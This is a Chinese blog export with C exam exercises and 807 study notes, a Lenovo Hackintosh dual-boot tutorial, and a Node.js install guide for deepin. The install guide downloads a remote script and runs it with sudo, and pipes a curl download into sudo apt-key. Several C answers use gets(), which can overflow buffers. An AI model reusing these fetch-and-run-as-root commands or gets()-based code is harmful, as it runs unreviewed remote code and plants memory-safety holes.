1.0/2，这语句的意思是每次循环result都加1.0/2，这个不是调和级数，正确答案应该是result第一次1.0/1，第二次+1.0/2，第3次+1.0/3，，，第n次+1.0/n 程序功能是每行输出5个*，共输出5行 12345678910111213#include&lt;stdio.h&gt;#define N 5int main()&#123; /*********Found (9) ***********/ double i; for (i = 1;i &lt;= N;i++) &#123; /*********Found (10) ***********/ printf("*****"); &#125; return 0;&#125; 答案： int i; printf(&quot;*****\n&quot;); 解析： 一般情况下，控制for循环执行次数的变量应当是整型 换行 分析程序题 写出以下程序的功能及运行结果 123456789101112#include&lt;stdio.h&gt;void main()&#123; int j; int a[6]=&#123;12,4,17,24,27,16&#125;,b[6]=&#123;27,1,4,25,23,16&#125;; for (j = 0;j &lt; 6;j++) &#123; if(a[j] == b[j]) break; printf("%d ",a[j]); &#125; printf("\n");&#125; 答案： 功能：比较a，b两数组对应位置的元素，如果相等，跳出，否则输出a数组该位置的元素 运行结果：12 4 17 24 27 解析：此题出题老师，故意在if语句处打了个缩进想误导大家，注意：if语句，for语句，如果后面没有花括号，起作用的是其后第一条实际语句 写出以下程序的功能 123456789101112131415161718#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;void main()&#123; char *str[10],*str1;int i,j; for (i = 0;i &lt; 10;i++) &#123; str[i] = (char *)malloc(20); gets(str[i]); &#125; for (i = 0;i &lt; 9;i++) for(j = 0;j &lt;= 8 - i;j++) if(strcmp(str[j],str[j+1])&gt;0) str1=str[j],str[j]=str[j+1],str[j+1]=str1; for (i = 0;i &lt; 10;i++) puts(str[i]); &#125; 答案：从键盘输入10个字符串，排序后升序输出解析：经典的字符串冒泡排序算法，升序和降序看strcmp(str[j],str[j+1])是大于0还是小于0（大于等于或者小于等于也可以），此题是大于0代表前项比后项大，后面做的操作是交换两个字符指针的指向，所以前项会一直比后项小，即升序 算法设计及编程题 输入一行字符，统计其中英文单词的个数。单词之间以空格为间隔。答案： 12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; char str[100]; gets(str); int i = 0,cnt = 0; // 不考虑最前面的空格 while (str[i] == ' ')&#123; i++; &#125; for (;str[i]!='\0';i++) &#123; if (i &gt; 0 &amp;&amp; str[i - 1] == ' ' &amp;&amp; str[i] != ' ') &#123; cnt++; &#125; &#125; if (str[0] != '\0' &amp;&amp; str[0] != ' ') &#123; cnt++; &#125; printf("%d\n",cnt); return 0;&#125; 流程图： 输入10个雇员的信息(姓名，工资号)，按工资号排序输出。要求雇员的信息用结构体，用两个函数分别完成10个雇员信息的输入及排序。答案： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define N 10struct employer&#123; int num; char name[N];&#125; employers[N];void input()&#123; int i = 0; for (;i &lt; N;i++) &#123; printf("请输入工资号："); scanf("%d",&amp;employers[i].num); getchar(); printf("请输入姓名："); scanf("%s",employers[i].name); &#125;&#125;void sort()&#123; struct employer tmp; int i = 0,j = 0; for (;i &lt; N - 1;i++) &#123; for (j = i + 1;j &lt; N;j++) &#123; if (employers[i].num &gt; employers[j].num) &#123; tmp = employers[i]; employers[i] = employers[j]; employers[j] = tmp; &#125; &#125; &#125;&#125;int main()&#123; int i = 0; input(); sort(); for (;i &lt; N;i++) &#123; printf("%d %s\n",employers[i].num,employers[i].name); &#125; return 0;&#125; 流程图：略，算法写出来，流程图直接画就可以了，参考上一题和我的博客807笔记 请编写函数char *fun(char *str,int m),实现将输入的字符串每个字符“循环左移”m位。例如，输入“ABCDE”，则循环左移2位应输出“CDEAB”，若输入“1234567”，则循环左移3位输出“4567123”。 在主函数中实现输入，调用函数fun,然后输出。 12345678910111213141516171819202122#include&lt;stdio.h&gt;#include&lt;string.h&gt;char *fun(char *str,int m)&#123; ......&#125;void main()&#123; char s[100]; int m; printf("Please input string:"); scanf("%s",s); printf("Enter m:"); scanf("%d",&amp;m); if (m &gt; strlen(s)) &#123; printf("\nData error.\n"); return; &#125; printf("Result is:%s\n",fun(s,m));&#125; 答案： 12345678910111213141516char *fun(char *str,int m)&#123; char *result = str; while (m-- &gt; 0) &#123; char tmp = str[0]; int i = 1; while (str[i] != '\0') &#123; str[i - 1] = str[i]; i++; &#125; str[i - 1] = tmp; &#125; return result;&#125; 流程图：略 编写程序，从键盘输入一串以“#”为结束符的字符串，并写入文本文件file.txt 中。答案： 123456789101112131415161718#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; FILE *fp = fopen("file.txt","w"); if (fp) &#123; char c = getchar(); while(c != '#') &#123; fprintf(fp,"%c",c); c = getchar(); &#125; fclose(fp); &#125; return 0;&#125; 流程图：略]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>807</tag>
        <tag>程序综合设计</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[联想IdeaPad 700-15ISK win10 黑苹果双系统教程]]></title>
    <url>%2Fposts%2Fad76eda8%2F</url>
    <content type="text"><![CDATA[说明 本文针对联想IdeaPad 700-15ISK，但是方法适用于所有机型装黑苹果双系统，差的仅仅是一个适合你机型的EFI，本人小白，不太会配置EFI，所用EFI为网络上搜集而来的，我只做了小小的修改和优化 电脑配置 电脑型号 联想 80RU操作系统 Microsoft Windows 10 专业版 (64位)CPU (英特尔)Intel(R) Core(TM) i5-6300HQ CPU @ 2.30GHz(2304 MHz)主板 联想 Lenovo ideapad 700-15ISK内存 12.00 GB (2133 MHz)硬盘1 130 GB (SAMSUNG MZVLV128HCGR-000L2)硬盘2 500 GB (希捷 ST500LT012-1DG142)显卡1 Intel(R) HD Graphics 530显卡2 NVIDIA GeForce GTX 950M显示器 京东方 BOE HF 32位真彩色 60Hz声卡1 Realtek High Definition Audio声卡2 英特尔(R) 显示器音频网卡1 Intel(R) Dual Band Wireless-AC 3165网卡2 Realtek PCIe GbE Family Controller 准备阶段 16G USB3.0 U盘 x1 镜像，推荐 黑果小兵的10.14.6镜像，小问题较少，适合使用 黑果小兵的10.14.2镜像，基本没什么问题，适合使用 黑果小兵的10.13.6镜像，小问题较多，不推荐使用 工具软件 DiskGenius：调整硬盘分区，挂载分区，备份还原硬盘分区等 EasyUEFI：调整启动项 explorer++：复制文件到efi分区 balenaEtcher：刻录安装镜像到U盘 winmd5free：校验md5，验证镜像文件完整性 WePE：建立PE方便救砖和调整分区大小 所有工具已打包好，点击使用百度网盘下载，提取码：bf5m EFI文件，提取码：3wcx 安装教程正式开始下载相关工具到本地，并安装有的工具是绿色版，解压即可用，有的工具需要安装，安装过程一路默认下一步即可 校验镜像md5 打开winmd5free 选择你要校验的镜像 计算完成后，将校验码（校验码在黑果小兵的博客上可以找到）粘贴到第二个框，点击verify校验 如果Matched！说明没问题，否则说明文件可能损坏，需要重新下载 刻录镜像到U盘（建议操作前先退出电脑管家） 插入U盘 打开balenaEtcher 点击Select image，选择本地下载好的macos镜像文件 点击flash，开始刻录 耐心等待镜像文件刻录完成 偶尔会弹出格式化驱动器，叉掉即可 叉掉后显示驱动器不可用，同样不管它，继续叉掉 刻录成功 关闭balenaEtcher 拔出U盘 win10或者PE下调整硬盘分区 打开DiskGenius，查看主硬盘分区格式，一定要是GPT 如果不是GPT，选中硬盘然后鼠标右键，选择转换分区表类型为GUID格式，然后去PE使用相关工具修复一下Windows的引导（此过程不再赘述，不会操作请自行百度） 检查ESP分区的大小，建议至少300兆 如果你的ESP分区不够300兆 先备份ESP分区到镜像文件，选中ESP分区，右键选择备份到镜像文件 然后删掉ESP分区 选中空闲分区，右键选择建立ESP/MSR分区 设置ESP分区大小为300兆，点击确定 选中新建立的ESP分区，右键选择从镜像文件还原分区 主硬盘预留60G左右用来装黑苹果，建议安装在固态硬盘上，如果你的固态全是C盘，那么你需要使用DiskGenius或者傲梅分区助手之类的软件，去无损调整你的C盘容量，此操作比较简单，百度教程极多，在此不再赘述 将刚才预留的60G左右的分区格式化为NTFS格式，选中空闲分区，鼠标右键建立新分区即可，确认之后，保存更改，自动提示格式化为NTFS 复制CLOVER到系统ESP分区 打开DiskGenius 选中主硬盘的ESP分区，鼠标右键，指派新的驱动器号（盘符） 记住指定的盘符，我这里是H盘，点击确定 找到explorer++，右键以管理员的身份打开 打开刚才挂载的H盘，展开EFI文件夹 找到CLOVER文件夹复制到EFI文件夹下 将CLOVER复制到EFI文件夹下,选中CLOVER文件夹，右键复制，到EFI分区下右键点击Paste（粘贴） 操作完成之后的截图 修改启动项 打开EasyUEFI 点击创建新项 填好相关信息，然后点击浏览 选中CLOVERx64.efi，点击确定 再次确认 调整启动顺序，将CLOVER放在最上面，选中CLOVER，鼠标点击上移键，建议一次次点，有一点卡，不要快速的连续点击 完成，可以看到CLOVER已经在最上面了 安装黑苹果 插入U盘，然后重启电脑，会自动进入CLOVER引导 选择Boot macOS Install from Install macOS Mojave 加载中 选择磁盘工具进行抹盘（一定要注意找到你预留安装mac的盘） 先选择显示所有分区 然后选择要安装macOS的盘，选择抹掉 格式选APFS 名称可以随意，我这里填Mac 选择安装macos 提示安装副本已损坏，这个是因为证书过期导致的，先断开网络然后用终端设置一下时间即可 如图，打开终端 在终端输入命令，date 102516242016，按回车键执行，然后关闭终端，重新回到macOS实用工具，选择安装macOS即可 安装macOS 阅读许可协议，点击继续 点击同意，继续 出现安装界面，这里是让你选择安装磁盘，选择之前我们抹掉的Mac盘，点击安装 正在安装 刚刚的过程并没有实际的安装，只是把文件复制进去了，等待自动重启，进入CLOVER，选择Boot macOS install from Mac，进入二次安装（不一定是from Mac，这里是因为我的磁盘名字叫做Mac） 不出意外，等待安装结束，你就可以享受黑苹果系统带来的乐趣了，enjoy it！ 成功 已知的一些小问题 10.13.6 不能登录iCloud，一登录重启就丢失引导 亮度修改快捷键无效，可用Karabiner-Elements修改 10.14.6 亮度修改快捷键无效，可用Karabiner-Elements修改 10.14.2 基本没问题 亮度可直接使用联想的功能键修改，跟windows下一模一样 通用的问题 独立显卡无解 无线网卡无解，可以去淘宝买一个comfast的USB网卡，20块钱，mac，windows，linux都可用 偶尔识别不到声卡，重启一下，问题就解决了；如果重启问题没解决的话，把ESP分区下的APPLE目录删除再重启就解决了]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>双系统</tag>
        <tag>黑苹果</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux下安装nodejs最新版]]></title>
    <url>%2Fposts%2F79193e4e%2F</url>
    <content type="text"><![CDATA[deepin下安装nodejs安装方式一 说明：理论上Debian系都支持，但是博主未测试，如果安装遇到问题，欢迎留言讨论 使用快捷键 Ctrl + Alt + T 打开终端 使用以下命令安装 1wget -O install-nodejs.sh https://zimo.coding.net/p/debain-install-nodejs/d/debain-install-nodejs.sh/git/raw/master/install-nodejs.sh &amp;&amp; sudo bash install-nodejs.sh 方式二 使用快捷键 Ctrl + Alt + T 打开终端 使用命令dedit install-nodejs.sh新建文件 将以下脚本复制，粘贴到install-nodejs.sh中 123456sudo apt install curlcurl -sSL https://deb.nodesource.com/gpgkey/nodesource.gpg.key | sudo apt-key add -echo "deb https://mirrors.tuna.tsinghua.edu.cn/nodesource/deb_12.x stretch main" | sudo tee /etc/apt/sources.list.d/nodesource.listecho "deb-src https://mirrors.tuna.tsinghua.edu.cn/nodesource/deb_10.x stretch main" | sudo tee -a /etc/apt/sources.list.d/nodesource.listsudo apt updatesudo apt install nodejs 保存，回到终端赋予执行权限，命令chmod +x install-nodejs.sh 使用命令./install-nodejs.sh执行安装： 验证12node -vnpm -v 成功出现下图版本，即为成功 其他Linux请参考nodejs官方文档安装]]></content>
      <categories>
        <category>linux</category>
        <category>nodejs</category>
      </categories>
      <tags>
        <tag>deepin</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[考研笔记之807程序综合设计]]></title>
    <url>%2Fposts%2Fc0a59335%2F</url>
    <content type="text"><![CDATA[博文声明 首先，本博客是博主花时间精心整理的，如果觉得整理得还不错，请打赏支持下，毕竟创作不易，打赏按钮在文末。 然后，如果发现博文有错误，可以直接评论，或者直接联系博主，博主审核后会尽快更新博客。 再者，本文所有代码实例：C标准是C89，IDE是CLion2019.2.4，编译器是gcc (Debian 5.5.0-12) 5.5.0。 另外，本文严禁任何形式的搬砖或者转载，违者必究。 最后，祝大家取得好成绩。 考试相关信息考试大纲 807考试大纲 1、C基础知识 （1）掌握数据类型、变量和赋值； （2）掌握输入和输出； （3）掌握基本运算符和表达式； （4）了解简单控制流程及流程图表示的规范。 2、选择结构程序设计 （1）掌握关系运算符； （2）掌握逻辑运算符； （3）掌握布尔表达式求值； （4）掌握if语句； （5）掌握switch语句； （6）理解分支结构的流程图表示。 3、循环控制 （1）掌握for循环； （2）掌握while循环； （3）掌握do-while循环； （4）理解循环结构的流程图表示。 4、数组的使用 （1）掌握一维数组； （2）掌握二维数组； （3）理解字符数组与字符串。 5、函数的使用 （1）掌握函数的原型声明、调用及返回； （2）掌握函数参数； （3）理解变量存储特性。 6、指针的使用 （1）理解指针的声明与初始化； （2）理解指针与数组； （3）理解字符串与指针。 7、结构体 （1）理解结构体变量； （2）了解结构体数组； （3）了解结构体与指针； （4）了解链表的使用。 参考书目《C程序设计第四版》-谭浩强 考题类型 单项选择题。 判断正误题。 程序分析题。 设计算法流程图题。 编程题。 笔记正文第一模块 C基础知识考试大纲的要求（1）掌握数据类型、变量和赋值；（2）掌握输入和输出；（3）掌握基本运算符和表达式；（4）了解简单控制流程及流程图表示的规范。 笔记C语言数据类型C语言中，数据类型可分为：基本数据类型，枚举类型（enum），派生类型，空类型（void）四大类。 注意：C语言基本数据类型，三个空填整型、实型、字符型，两个空填整型和实型，其中实型也可改为浮点型。 C语言数据类型 基本数据类型 整型类型 整型（int） 短整型（short） 长整型（long） 浮点类型（也叫实型） 单精度浮点型（float） 双精度浮点型（double） 字符类型（char）（也可看做整型） 枚举类型（enum） 空类型（void） 派生类型 指针类型（*） 数组类型（[]） 结构体类型（struct） 共用体类型（union） C语言数据类型的存储空间和值的范围 类型 存储空间（字节） 值的范围 int 4 -2147483648～2147483647，即-231～231-1 short 2 -32768～32767，即-215～215-1 char 1 -128～127，即-27～27-1 float 4 有效数字6位，范围:0以及1.2x10-38～3.4x1038 double 8 有效数字15位，范围:0以及2.3x10-308～1.7x10308 标识符 标识符是给常量或者变量起的名字。 C语言标识符规范：标识符可以是字母(A～Z，a～z)、数字(0～9)、下划线_组成的字符串，并且第一个字符必须是字母或下划线 注意事项 标识符不能是C语言关键字； 标识符不能重复定义； 标识符大小写敏感； 标识符长度不要太长； 标识符最好见名知意。 C语言常量程序运行过程中，值不会改变的量，一般用来给变量赋值，直接放在等号的右边（这样的常量也叫字面量），如int a = 120;float b = 0.1234;// 等号左边的a,b是变量（标识符），等号右边的整数和小数是字面量。 符号常量用编译预处理语句（不是C语言的语句）声明的常量叫符号常量，如：#define 标识符 常量值，这样的常量在编译前，定义的标识符就会被预处理，整体替换为后面的常量值。 字面量字面量通常是直接写在赋值（=）号右边的常量。 整型常量：整数，通常指十进制整数，由0-9的数字组成，可带正负号，如6，+100，-3等。 八进制整型常量：八进制整数，以0开头，由0-7的数字组成，可带正负号，如-01,011,+077等； 十进制整型常量：通常意义上的整型常量； 十六进制整型常量：十六进制整数，以0x开头，由0-9的数字和字母a-f组成，可带正负号，如0x17a，-0xffff，+0xabc123，0XabA1（字母可大写，可大小写混合）； 注意：C语言中没有二进制整型常量。 实型常量：小数，一般不考虑进制，即默认为十进制小数，当小数点前一位只有0时，可以省略0，即0.121还可以表示为.121；同理指数形式也可省略，0.2e3还可以表示为.2e3。 十进制小数形式：由数字和小数点组成，可带正负号，如0.123，+6.24，-3.2等； 指数形式：以字母e代表10为底的指数，指数只能是整数（即e3表示10的3次方，e-5表示10的-5次方），如12.3e-5，3.1e10，+1e0，,1.2e3； 注意：指数形式，当小数点前面只有0，且e前没有整数时，0不可省略，如0.e5，如果省略就变成了.e5，是错误的 字符常量：用单撇号括起来的字符，通常只有一个字符，转义字符除外。 普通字符：用单撇号括起来的一个字符，如‘a’，‘3’，‘A’，‘$’，‘ ’，&#39;&quot;&#39;等 转义字符：以\开头的字符，如&#39;\n&#39;，&#39;\t&#39;,&#39;\\&#39;，&#39;\&#39;&#39;，‘\&quot;’等。 八进制字符（属于转义字符的一种）：用单撇号括起来的以\开头，由0-7的数字组成的串，最多只有三位数字，理解的时候转换为十进制所对应的ASCII码所对应的字符即可，如：&#39;\041&#39;，&#39;\040&#39; 十六进制字符（属于转义字符的一种）：用单撇号括起来的以\x开头，由0-9的数字和a-z的字母组成的串，最多只有两位，理解的时候转换为十进制所对应的ASCII码所对应的字符即可，如：&#39;\x28&#39;，&#39;\x29&#39; 字符串常量：用双撇号括起来的零个或者多个字符（可以是上面的字符常量组成），如&quot;abd&quot;，&quot;sdf123&quot;，“1”等。 字符常量——转义字符表转义字符 意义 ASCII码值（十进制） \a 响铃(BEL) 007 \b 退格(BS) ，将当前位置移到前一列 008 \f 换页(FF)，将当前位置移到下页开头 012 \n 换行(LF) ，将当前位置移到下一行开头 010 \r 回车(CR) ，将当前位置移到本行开头 013 \t 水平制表(HT) （跳到下一个TAB位置） 009 \v 垂直制表(VT) 011 \\ 代表一个反斜线字符''\' 092 \' 代表一个单引号（撇号）字符 039 \" 代表一个双引号字符 034 \?代表一个问号063\0 空字符(NUL) 000 \ddd 1到3位八进制数所代表的任意字符 三位八进制 \xhh 十六进制所代表的任意字符 两位十六进制 C语言变量程序运行过程中，值可以改变的量。 变量会占据内存中一定的存储单元； 使用变量之前必须先定义； 变量名和变量值是完全不同的两个概念； 变量定义的一般形式为：数据类型 变量名; 可以同时定义多个类型相同的变量：数据类型 变量名, 变量名, 变量名…; 变量名必须满足标识符的规范； 数据类型必须是C语言数据类型； 如果定义了变量未赋值就使用，那么该变量的值将不可预测。 给变量赋值的方式 先定义后赋值。 定义的同时赋值。 注意：变量在定义中不允许连续赋值，如：int a = b = c = 3;是错误的语句，但是已经定义好的变量允许连续赋值。 1234567891011#include &lt;stdio.h&gt;int main() &#123; // 示例代码——定义变量，并给变量赋值 int a; a = 2;// 先定义后赋值 double b = -.14;// 定义的同时赋值 int c,d; c = d = a = 5;// 已经定义好了的变量可以连续赋值 return 0;&#125; C语言输入与输出C语言没有输入输出语句C语言的输入输出操作都需要依赖库函数，常用的输入输出函数是scanf()和printf()，使用时需要先引入头文件#include&lt;stdio.h&gt;。 C语言printf()函数格式化输出函数。 函数原型：int printf(const char *format, ...)用法：printf(“格式控制字符串”, 输出表列)功能：将变量转化为“格式控制字符串”所规定格式的数据，然后输出到终端中。格式字符串是以%开头的字符串，在%后面跟有各种格式字符，以说明输出数据的类型、形式、长度、小数位数等，一般形式为[标志][输出最小宽度][.精度][长度]类型，（注意：[]表示可省略的项）。 类型： 格式字符 意义 d 以十进制形式输出带符号整数(正数不输出符号) o 以八进制形式输出无符号整数(不输出前缀0) x,X 以十六进制形式输出无符号整数(不输出前缀Ox) u 以十进制形式输出无符号整数 f 以小数形式输出单、双精度实数 e,E 以指数形式输出单、双精度实数 g,G 以%f或%e中较短的输出宽度输出单、双精度实数 c 输出单个字符 s 输出字符串 标志： 标 志 意义 - 结果左对齐，右边填空格 + 输出符号(正号或负号) 空格 输出值为正时冠以空格，为负时冠以负号 # 对c、s、d、u类无影响； 对o类，在输出时加前缀o； 对x类，在输出时加前缀0x； 对e、g、f 类当结果有小数时才给出小数点。 输出最小宽度 用十进制整数来表示输出的最少位数。若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0。 精度 精度格式符以“.”开头，后跟十进制整数。 长度 长度格式符为h、l两种，h表示按短整型量输出，l表示按长整型量输出。 printf()函数实例 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;int main() &#123; int a = 15; double b = 123.1234567; double c = 12345678.1234567; char d = 'p'; printf("a=%d\n", a); printf("a(%%d)=%d, a(%%5d)=%5d, a(%%o)=%o, a(%%x)=%x\n\n", a, a, a, a); // %% 可以输出 % printf("b=%f\n", b); printf("b=%-8.2f\n", b); // 左对齐，占8格，四舍五入后精确到小数点后两位 printf("b(%%f)=%f, b(%%lf)=%lf, b(%%5.4lf)=%5.4lf, b(%%e)=%e\n\n", b, b, b, b); printf("c=%f\n", c); printf("c(%%lf)=%lf, c(%%f)=%f, c(%%8.4lf)=%8.4lf\n\n", c, c, c); printf("d=%c\n", d); printf("d(%%c)=%c, d(%%8c)=%8c\n", d, d); return 0;&#125;/*输出结果*//*a=15a(%d)=15, a(%5d)= 15, a(%o)=17, a(%x)=fb=123.125457b=123.13 b(%f)=123.125457, b(%lf)=123.125457, b(%5.4lf)=123.1255, b(%e)=1.231255e+02c=12345678.123457c(%lf)=12345678.123457, c(%f)=12345678.123457, c(%8.4lf)=12345678.1235d=pd(%c)=p, d(%8c)= p*/ C语言scanf()函数格式化输入函数。 函数原型：int scanf(const char *format, ...)用法：scanf(&quot;输入控制符&quot;, 输入参数)功能：将从键盘输入的字符转化为“输入控制符”所规定格式的数据，然后存入以输入参数的值为地址的变量中。输入控制符几乎与printf()一模一样。注意：输入参数接收的是地址，在某些情况下，请注意使用&amp;运算符。 小结printf()和scanf() 细节很多，不用全部熟记，熟记下面的注意事项即可； 控制符中，%d、%f、%s、%c 最常用，功能分别是输出整数、实数、字符串和字符； printf()使用时需注意转义字符有特殊的含义； scanf()在某些情况下，使用时需注意使用&amp;运算符； 编译器不会检查输入和输出的参数数目与控制符数目是否一致； scanf()函数的双引号内，除了“输入控制符”外尽量什么都不要写，否则读入可能跟预想不一样； 使用scanf()函数输入字符串时，要注意，scanf()读到第一个空格、或者Tab或者回车符就会结束读入； 在某些情况下可能会遇到scanf()和printf()的返回值，所以特别说明一下，返回值的意义，用scanf()读取几个数据，则scanf()的返回值为几，printf()同理，用printf()输出几个数据，则printf()的返回值为几。 printf()函数拓展问题，请思考下面的程序输出结果是？1234567#include &lt;stdio.h&gt;int main() &#123; int i = 1; printf("i=%d,i++=%d,++i=%d",i,i++,++i); return 0;&#125; C语言其他输入输出函数 getchar()，输入单个字符，常用来去掉scanf()缓存的回车符。 putchar()，输出单个字符。 gets()，输入字符串，可以输入含空格的字符串。 puts()，输出字符串。 C语言基本运算符算术运算符下表显示了 C 语言支持的所有算术运算符。假设变量 A 的值为 3，变量 B 的值为 20，则： 运算符描述实例 +把两个操作数相加 A + B 将得到 23 -从第一个操作数中减去第二个操作数 A - B 将得到 -17 *把两个操作数相乘 A * B 将得到 60 /分子除以分母 B / A 将得到 6（整型 / 整型 最后的结果还是整型，所以没有小数部分） %取模运算符，整除后的余数 B % A 将得到 2 ++自增运算符，整数值增加 1 A++ 将得到 4 --自减运算符，整数值减少 1 A-- 将得到 2 注意：B = A++、B = A--先赋值后运算，B = ++A、B = --A先运算后赋值 关系运算符下表显示了 C 语言支持的所有关系运算符。假设变量 A 的值为 10，变量 B 的值为 20，则： 运算符描述实例 ==检查两个操作数的值是否相等，如果相等则条件为真。 (A == B) 为假。 !=检查两个操作数的值是否相等，如果不相等则条件为真。 (A != B) 为真。 &gt;检查左操作数的值是否大于右操作数的值，如果是则条件为真。 (A &gt; B) 为假。 &lt;检查左操作数的值是否小于右操作数的值，如果是则条件为真。 (A &lt; B) 为真。 &gt;=检查左操作数的值是否大于或等于右操作数的值，如果是则条件为真。 (A &gt;= B) 为假。 &lt;=检查左操作数的值是否小于或等于右操作数的值，如果是则条件为真。 (A &lt;= B) 为真。 逻辑运算符下表显示了 C 语言支持的所有关系逻辑运算符。假设变量 A 的值为 1，变量 B 的值为 0，则： 运算符描述实例 &amp;&amp;称为逻辑与运算符。如果两个操作数都非零，则条件为真。 (A &amp;&amp; B) 为假。 ||称为逻辑或运算符。如果两个操作数中有任意一个非零，则条件为真。 (A || B) 为真。 !称为逻辑非运算符。用来逆转操作数的逻辑状态。如果条件为真则逻辑非运算符将使其为假。 !(A &amp;&amp; B) 为真。 赋值运算符下表列出了 C 语言支持的赋值运算符： 运算符描述实例 =简单的赋值运算符，把右边操作数的值赋给左边操作数 C = A + B 将把 A + B 的值赋给 C +=加且赋值运算符，把右边操作数加上左边操作数的结果赋值给左边操作数 C += A 相当于 C = C + A -=减且赋值运算符，把左边操作数减去右边操作数的结果赋值给左边操作数 C -= A 相当于 C = C - A *=乘且赋值运算符，把右边操作数乘以左边操作数的结果赋值给左边操作数 C *= A 相当于 C = C * A /=除且赋值运算符，把左边操作数除以右边操作数的结果赋值给左边操作数 C /= A 相当于 C = C / A %=求模且赋值运算符，求两个操作数的模赋值给左边操作数 C %= A 相当于 C = C % A 其他运算符 sizeof &amp; 三元 运算符描述实例 sizeof()返回变量或者类型的大小。sizeof(a) 将返回 4，其中 a 是整数。 sizeof(double) 将返回 8 &amp;返回变量的地址。&amp;a; 将给出变量的地址。 *指向一个变量或取指针所指向内存地址的值。int *a = &b; 将指向一个变量。b = *a：将取出a指向地址的变量值赋值给b。 条件表达式 ? X : Y ;条件表达式如果条件为真 ? 则值为 X : 否则值为 Y C语音中的运算符优先级运算符的优先级确定表达式怎么计算，最终会影响到表达式的值。某些运算符比其他运算符有更高的优先级，例如，乘除运算符具有比加减运算符更高的优先级。 下表将按运算符优先级从高到低列出各个运算符，具有较高优先级的运算符出现在表格的上面，具有较低优先级的运算符出现在表格的下面。在表达式中，较高优先级的运算符会优先被计算。 类别&nbsp; 运算符&nbsp;结合性&nbsp; 后缀运算符&nbsp;() [] -&gt; . ++ - - &nbsp; 从左到右&nbsp; 一元运算符&nbsp; + - ! ~ ++ - - (type)* &amp; sizeof&nbsp; 从右到左&nbsp; 乘除运算符&nbsp; * / %&nbsp;从左到右&nbsp; 加减运算符&nbsp;+ -&nbsp; 从左到右&nbsp; 关系运算符&nbsp;&lt; &lt;= &gt; &gt;=&nbsp; 从左到右&nbsp; 相等运算符&nbsp; == !=&nbsp; 从左到右&nbsp; 条件运算符&nbsp;?:&nbsp; 从右到左&nbsp; 赋值运算符&nbsp; = += -= *= /= %=&gt;&gt;= &lt;&lt;= &amp;= ^= |=&nbsp;从右到左&nbsp; 逗号运算符&nbsp; ,&nbsp; 从左到右&nbsp; C语言表达式表达式（Expression）和语句（Statement）的概念在C语言中并没有明确的定义: 表达式可以看做一个计算的公式（字面理解是表达某种含义的式子），往往由数据、变量、运算符等组成，例如3*4+5、a=c=d等，表达式的结果必定是一个值； 语句的范围更加广泛，不一定是计算，不一定有值，可以是某个操作、某个函数、选择结构、循环等。 划重点： 表达式必须有一个执行结果，这个结果必须是一个值，例如3*4+5的结果 17，a=c=d=10的结果是 10，printf(&quot;hello&quot;)的结果是 5（printf()函数的返回值是成功打印的字符的个数）。 以分号;结束的往往称为语句，而不是表达式，例如3*4+5;、a=c=d;等； 语句不一定以分号结束，比如if语句，for语句 自动类型转换一个表达式中出现不同类型间的混合运算，较低类型将自动向较高类型转换，这个自动转换的过程就叫自动类型转换。 不同数据类型之间的差别在于数据的表示范围及精度上，一般情况下，数据的表示范围越大、精度越高，其类型也越“高级”。 赋值运算中如果左值精度比右值精度低，将会出现截断，会导致精度丢失。 当函数调用时，所传实参与形参类型不一致时，也会把实参自动转换为形参类型后再赋值（类型以形参为准）。 强制类型转换C 语言提供了可显式指定类型转换的语法支持，通常称之为强制类型转换。 1(目标类型) 表达式 算法流程图基本符号 顺序结构基本流程图 选择结构基本流程图 循环结构基本流程图 画流程图的步骤 写算法描述。 转换为图（需要按照实际情况组合顺序结构，循环结构，选择结构对应的基本流程图）。 实例：判断闰年，画法一算法描述： 123451. 从键盘输入year年份2. 判断year是否满足year % 4 == 0 &amp;&amp; year % 100 != 03. 是，输出year是闰年4. 不是，判断year是否满足year % 100 == 0 &amp;&amp; year % 400 == 05. 是，输出year是闰年，否则输出year不是闰年 流程图： 代码实现： 1234567891011121314#include &lt;stdio.h&gt;int main() &#123; int year; scanf("%d", &amp;year); if (year % 4 == 0 &amp;&amp; year % 100 != 0) &#123; printf("%d 是闰年", year); &#125; else if (year % 100 == 0 &amp;&amp; year % 400 == 0) &#123; printf("%d 是闰年", year); &#125; else &#123; printf("%d 不是闰年", year); &#125; return 0;&#125; 实例：判断闰年，画法二算法描述： 12345678主流程：1. 从键盘输入year年份2. 判断是否闰年，若是，输出year是闰年，否则输出输出year不是闰年子流程：判断是否闰年：参数是输入年份1. 判断year是否满足year % 4 == 0 &amp;&amp; year % 100 != 02. 是，返回13. 不是，判断year是否满足year % 100 == 0 &amp;&amp; year % 400 == 04. 是，返回1，否则返回0 流程图： 代码实现： 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;stdbool.h&gt;bool isLeapYear(int year);int main() &#123; int year; scanf("%d", &amp;year); if (isLeapYear(year)) &#123; printf("%d 是闰年", year); &#125; else &#123; printf("%d 不是闰年", year); &#125; return 0;&#125;bool isLeapYear(int year) &#123; if (year % 4 == 0 &amp;&amp; year % 100 != 0) &#123; return 1; &#125; if (year % 100 == 0 &amp;&amp; year % 400 == 0) &#123; return 1; &#125; return 0;&#125; 第二模块 选择结构程序设计考试大纲的要求（1）掌握关系运算符；（2）掌握逻辑运算符；（3）掌握布尔表达式求值；（4）掌握if语句；（5）掌握switch语句；（6）理解分支结构的流程图表示。 笔记C语言逻辑真假非0为真（true），0为假（false）。 在关系和逻辑表达式中，若表达式为真则值取1，否则值取0。 关系运算符C 语言提供的关系运算符有： &gt;（大于）、&gt;=（大于等于）、&lt;（小于）、&lt;=（小于等于）、==（等于）和 !=（不等于）6 种二元关系运算符。 在以上 6 种关系运算符中，前 4 个的优先级高于最后两个。 由关系运算符组成的式子为关系表达式，如 a &gt; b 即为关系表达式，在 C 